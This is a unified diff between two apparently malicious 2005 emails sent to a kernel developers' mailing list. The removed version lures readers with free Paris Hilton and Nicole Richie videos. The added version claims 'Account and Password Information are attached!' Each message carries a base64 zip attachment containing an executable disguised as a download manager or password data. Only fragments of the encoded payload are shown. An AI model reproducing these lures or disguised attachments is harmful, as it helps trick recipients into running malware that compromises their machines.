@@ -1,30 +1,29 @@
-From: postman@gpt.co.uk.sgi.com
-Subject: Paris Hilton & Nicole Richie
-Date: Fri, 16 Dec 2005 01:34:33 GMT
-Message-ID: <0fb7fcceb341944c2eb@gpt.co.uk>
+From: hostmaster@purplet.demon.co.uk.sgi.com
+Subject: Your Password
+Date: Fri, 16 Dec 2005 01:32:36 UTC
+Message-ID: <df6e5fa26aacefee6d@oss.sgi.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=03e4754e.94ceaec81eaacae"
+Content-Type: multipart/mixed; boundary="====9e07391fcc5b30d4793"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev@oss.sgi.com
+To: email@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=03e4754e.94ceaec81eaacae
+--====9e07391fcc5b30d4793
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---=03e4754e.94ceaec81eaacae
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.purplet.demon.co.uk
+***** Email: postman@purplet.demon.co.uk
+--====9e07391fcc5b30d4793
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=03e4754e.94ceaec81eaacae--
+--====9e07391fcc5b30d4793--
